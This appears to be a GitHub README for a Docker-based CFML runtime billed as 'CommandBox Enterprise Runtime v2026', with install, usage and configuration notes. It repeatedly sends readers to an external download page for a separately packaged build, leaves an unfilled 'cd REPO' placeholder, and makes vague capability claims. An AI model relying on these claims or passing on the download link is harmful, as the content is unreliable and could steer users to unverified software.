# CommandBox Enterprise Runtime v2026 - CFML Docker Runtime 2026

> **A container-friendly CFML runtime for Docker and Java deployments, created to fit modern CommandBox, Lucee, and ColdFusion workflows in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Docker-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/tylerwest61/commandbox-cfml-docker-runtime?style=flat-square)](https://github.com/tylerwest61/commandbox-cfml-docker-runtime)

---

<p align="center">
  <a href="https://tylerwest61.github.io/commandbox-cfml-docker-runtime/">
    <img src="https://img.shields.io/badge/Download-CommandBox%20Enterprise%20Runtime%20Latest-brightgreen?style=for-the-badge" alt="Download CommandBox Enterprise Runtime">
  </a>
</p>

> **[Download - CommandBox Enterprise Runtime v2026](https://tylerwest61.github.io/commandbox-cfml-docker-runtime/)**

---

[Download Latest Build](https://tylerwest61.github.io/commandbox-cfml-docker-runtime/)

---

## Overview

CommandBox Enterprise Runtime is a Docker-based CFML runtime for teams that want a container-first way to run and manage CFML applications. It combines CommandBox, Java, Lucee, and ColdFusion-focused tooling into a package that fits enterprise deployment practices and repeatable environments.

It is built for developers and platform teams updating older CFML applications or delivering new services that require the same infrastructure across local development, CI workflows, and production clusters. The runtime also includes support for microservice analysis and blueprint generation, which makes it helpful when reviewing application layout, container planning, or Kubernetes migration paths.

---

## Capabilities

- CFML runtime designed for Docker-centered workflows
- Compatibility with CommandBox, Java, Lucee, and ColdFusion-related setups
- Suited to legacy application modernization
- Microservice analysis and blueprint generation support
- Works with Docker deployment pipelines
- Ready for Kubernetes deployment patterns
- Runtime capabilities with observability in mind
- Enterprise-oriented security features for containerized environments

---

## Installation

1. Download or clone the repository:
   ```bash
   git clone https://github.com/tylerwest61/commandbox-cfml-docker-runtime.git
   cd REPO
   ```

2. Build or pull the image according to your deployment process.

3. Start the runtime from Docker or your orchestration layer:
   ```bash
   docker run --rm -p 8080:8080 tylerwest61/commandbox-cfml-docker-runtime
   ```

If you use a packaged release from the download page, launch it following the release instructions included with that build.

---

## Usage

Treat the runtime as the container base for CFML applications that need a consistent Java and CommandBox environment. A common flow looks like this:

1. Add your application or deployment artifacts to the container image or a mounted volume.
2. Start the runtime with the ports, volumes, and environment variables your application needs.
3. Connect your CFML app, service, or reverse proxy to the running container.
4. For Kubernetes, include the image in your pod or workload definition.

Example Docker workflow:

```bash
docker pull tylerwest61/commandbox-cfml-docker-runtime
docker run -d --name cfml-runtime -p 8080:8080 tylerwest61/commandbox-cfml-docker-runtime
```

Example Kubernetes workflow:

```bash
kubectl apply -f deployment.yaml
```

---

## Configuration

Runtime behavior is usually controlled through container environment variables, mounted files, or deployment manifests. Typical settings you may want to tune include:

```yaml
environment:
  - JAVA_OPTS=-Xms512m -Xmx1024m
  - BOX_ENV=production
  - CFML_ENGINE=lucee
```

If your deployment needs extra runtime configuration, keep it near the image definition so the container behaves the same way in every environment.

---

## Requirements

- Docker
- A compatible Java runtime environment
- CFML application files or deployment artifacts
- Optional Kubernetes cluster for orchestration
- Sufficient storage for image layers, logs, and application assets

---

## FAQ

**How do I stay current?**  
Use the latest build link above and rebuild or redeploy with the newest release whenever you need an updated runtime.

**Is Kubernetes supported?**  
Yes. The runtime is meant to work in Docker and Kubernetes-based deployment workflows.

**Where do runtime settings belong?**  
Use environment variables, mounted configuration files, or your orchestration manifests.

**What if the container fails to start?**  
Check the container logs, confirm port mappings, and make sure your Java and CFML settings align with the application you are running.

**Is this only intended for new applications?**  
No. It is also a good fit for modernization work where you need to package or inspect existing CFML applications in containers.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
